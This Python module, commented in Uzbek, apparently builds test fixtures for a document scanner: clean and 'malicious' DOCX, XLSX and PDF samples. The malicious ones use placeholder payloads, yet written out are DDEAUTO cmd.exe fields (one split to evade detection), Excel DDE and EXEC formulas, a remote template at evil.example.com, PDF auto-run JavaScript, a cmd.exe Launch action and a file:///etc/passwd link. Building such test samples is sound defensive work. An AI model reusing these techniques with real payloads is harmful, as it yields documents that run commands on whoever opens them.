"""Sinov namunalari yasash. DIQQAT: bular HAQIQIY zararli emas, faqat tuzilmasi xavfli fayllarga o'xshaydi
(soxta vbaProject.bin, example.com havolalar, 'alert' JavaScript). Xavfsiz sinov uchun."""
from __future__ import annotations

import io
import re
import zipfile

import openpyxl
import pikepdf
from docx import Document
from pikepdf import Array, Dictionary, Name, String

REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
R_BASE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
FAKE_BIN = b"\xd0\xcf\x11\xe0FAKE-OLE-OR-VBA-PAYLOAD-FOR-TESTS-ONLY"


def read_zip(data: bytes) -> dict[str, bytes]:
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        return {i.filename: zf.read(i) for i in zf.infolist()}


def write_zip(parts: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in parts.items():
            zf.writestr(name, data)
    return buf.getvalue()


def add_rel(parts: dict[str, bytes], rels_name: str, rid: str, rtype: str, target: str, external: bool = False) -> None:
    xml = parts.get(rels_name, f'<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="{REL_NS}"></Relationships>'.encode()).decode()
    mode = ' TargetMode="External"' if external else ""
    rel = f'<Relationship Id="{rid}" Type="{rtype}" Target="{target}"{mode}/>'
    parts[rels_name] = xml.replace("</Relationships>", rel + "</Relationships>").encode()


def add_override(parts: dict[str, bytes], part: str, ct: str) -> None:
    xml = parts["[Content_Types].xml"].decode()
    parts["[Content_Types].xml"] = xml.replace("</Types>", f'<Override PartName="/{part}" ContentType="{ct}"/></Types>').encode()


def make_plain_docx(author: str = "Ali Valiyev") -> bytes:
    doc = Document()
    doc.add_paragraph("Salom, bu oddiy hujjat.")
    doc.core_properties.author = author
    doc.core_properties.last_modified_by = "Vali"
    buf = io.BytesIO()
    doc.save(buf)
    return buf.getvalue()


def make_malicious_docx(macro_enabled: bool = True) -> bytes:
    parts = read_zip(make_plain_docx())
    # 1) VBA makro
    parts["word/vbaProject.bin"] = FAKE_BIN
    add_rel(parts, "word/_rels/document.xml.rels", "rIdVba", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin")
    # 2) OLE obyekt
    parts["word/embeddings/oleObject1.bin"] = FAKE_BIN
    add_rel(parts, "word/_rels/document.xml.rels", "rIdOle", f"{R_BASE}/oleObject", "embeddings/oleObject1.bin")
    # 3) Remote template
    add_rel(parts, "word/_rels/settings.xml.rels", "rIdTpl", f"{R_BASE}/attachedTemplate", "http://evil.example.com/macro.dotm", external=True)
    settings = parts["word/settings.xml"].decode()
    settings = re.sub(r"(<w:settings[^>]*>)", r'\1<w:attachedTemplate r:id="rIdTpl"/>', settings, count=1)
    root_tag = re.match(r"<w:settings[^>]*>", settings[settings.index("<w:settings"):]).group(0)
    if "xmlns:r=" not in root_tag:
        settings = settings.replace("<w:settings ", f'<w:settings xmlns:r="{R_BASE}" ', 1)
    parts["word/settings.xml"] = settings.encode()
    # 4) Oddiy va xavfli giperhavola, DDE maydon
    add_rel(parts, "word/_rels/document.xml.rels", "rIdLinkOk", f"{R_BASE}/hyperlink", "https://example.com/page", external=True)
    add_rel(parts, "word/_rels/document.xml.rels", "rIdLinkBad", f"{R_BASE}/hyperlink", "javascript:alert(1)", external=True)
    body_add = (
        '<w:p><w:hyperlink r:id="rIdLinkOk"><w:r><w:t>yaxshi havola</w:t></w:r></w:hyperlink></w:p>'
        '<w:p><w:hyperlink r:id="rIdLinkBad"><w:r><w:t>yomon havola</w:t></w:r></w:hyperlink></w:p>'
        '<w:p><w:fldSimple w:instr=\'DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"\'><w:r><w:t>DDE natija</w:t></w:r></w:fldSimple></w:p>'
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DD</w:instrText></w:r>'
        '<w:r><w:instrText>E "cmd" "/c calc"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        '<w:r><w:t>bo\'lingan DDE</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
        '<w:p><w:object><o:OLEObject xmlns:o="urn:schemas-microsoft-com:office:office" r:id="rIdOle"/></w:object></w:p>'
    )
    doc_xml = parts["word/document.xml"].decode()
    doc_xml = doc_xml.replace("<w:sectPr", body_add + "<w:sectPr", 1)
    parts["word/document.xml"] = doc_xml.encode()
    # 5) Content-types: bin kengaytma va makro-yoqilgan asosiy tur
    ct = parts["[Content_Types].xml"].decode()
    if 'Extension="bin"' not in ct:
        ct = ct.replace("<Override", '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override', 1)
    if macro_enabled:
        ct = ct.replace(
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
            "application/vnd.ms-word.document.macroEnabled.main+xml",
        )
    parts["[Content_Types].xml"] = ct.encode()
    # 6) Havolasiz yashirin vbaProject (orphan)
    parts["word/hidden/vbaProject.bin"] = FAKE_BIN
    return write_zip(parts)


def make_plain_xlsx() -> bytes:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws["A1"] = 10
    ws["A2"] = 20
    ws["A3"] = "=SUM(A1:A2)"
    wb.properties.creator = "Ali Valiyev"
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def make_malicious_xlsx() -> bytes:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws["A1"] = 10
    ws["A2"] = "=SUM(A1,5)"
    ws["B1"] = "='[1]Sheet1'!A1"  # tashqi fayl havolasi
    ws["B2"] = "=cmd|' /C calc'!A0"  # DDE
    ws["B3"] = '=EXEC("calc.exe")'
    wb.properties.creator = "Ali Valiyev"
    buf = io.BytesIO()
    wb.save(buf)
    parts = read_zip(buf.getvalue())

    parts["xl/vbaProject.bin"] = FAKE_BIN
    add_rel(parts, "xl/_rels/workbook.xml.rels", "rIdVba", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin")

    parts["xl/externalLinks/externalLink1.xml"] = (
        b'<?xml version="1.0" encoding="UTF-8"?><externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'
    )
    add_rel(parts, "xl/_rels/workbook.xml.rels", "rIdExt", f"{R_BASE}/externalLink", "externalLinks/externalLink1.xml")
    add_rel(parts, "xl/externalLinks/_rels/externalLink1.xml.rels", "rId1", f"{R_BASE}/externalLinkPath", "file:///C:/secret/book.xlsx", external=True)
    add_override(parts, "xl/externalLinks/externalLink1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml")

    parts["xl/macrosheets/sheet1.xml"] = (
        b'<?xml version="1.0" encoding="UTF-8"?><xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><xm:sheetData/></xm:macrosheet>'
    )
    add_rel(parts, "xl/_rels/workbook.xml.rels", "rIdMac", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml")
    add_override(parts, "xl/macrosheets/sheet1.xml", "application/vnd.ms-excel.macrosheet+xml")

    wbx = parts["xl/workbook.xml"].decode()
    root_tag = re.match(r"<workbook[^>]*>", wbx[wbx.index("<workbook"):]).group(0)
    if "xmlns:r=" not in root_tag:
        wbx = wbx.replace("<workbook ", f'<workbook xmlns:r="{R_BASE}" ', 1)
    wbx = wbx.replace("</sheets>", '<sheet name="Macro1" sheetId="9" state="veryHidden" r:id="rIdMac"/></sheets>')
    wbx = wbx.replace("</workbook>", '<externalReferences><externalReference r:id="rIdExt"/></externalReferences></workbook>')
    parts["xl/workbook.xml"] = wbx.encode()

    ct = parts["[Content_Types].xml"].decode()
    if 'Extension="bin"' not in ct:
        ct = ct.replace("<Override", '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override', 1)
    parts["[Content_Types].xml"] = ct.encode()
    return write_zip(parts)


def make_malicious_pdf() -> bytes:
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(200, 200))
    js = pdf.make_indirect(Dictionary(S=Name.JavaScript, JS=String("app.alert('test only')")))
    pdf.Root.OpenAction = js
    pdf.Root.AA = Dictionary(WC=js)
    pdf.Root.Names = Dictionary(JavaScript=Dictionary(Names=Array([String("a"), js])))
    pdf.attachments["payload.exe"] = b"FAKE-EXECUTABLE-FOR-TESTS-ONLY"
    launch = pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=Name.Link, Rect=[0, 0, 10, 10], A=Dictionary(S=Name.Launch, F=String("cmd.exe"))))
    uri_ok = pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=Name.Link, Rect=[0, 20, 10, 30], A=Dictionary(S=Name.URI, URI=String("https://example.com"))))
    uri_bad = pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=Name.Link, Rect=[0, 40, 10, 50], A=Dictionary(S=Name.URI, URI=String("file:///etc/passwd"))))
    movie = pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=Name.Screen, Rect=[0, 60, 10, 70]))
    pdf.pages[0].obj.Annots = Array([launch, uri_ok, uri_bad, movie])
    pdf.pages[0].obj.AA = Dictionary(O=js)
    pdf.docinfo["/Author"] = "Ali Valiyev"
    pdf.docinfo["/Producer"] = "Test Producer"
    with pdf.open_metadata() as meta:
        meta["dc:creator"] = ["Ali Valiyev"]
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def make_plain_pdf() -> bytes:
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(200, 200))
    pdf.add_blank_page(page_size=(100, 100))
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()
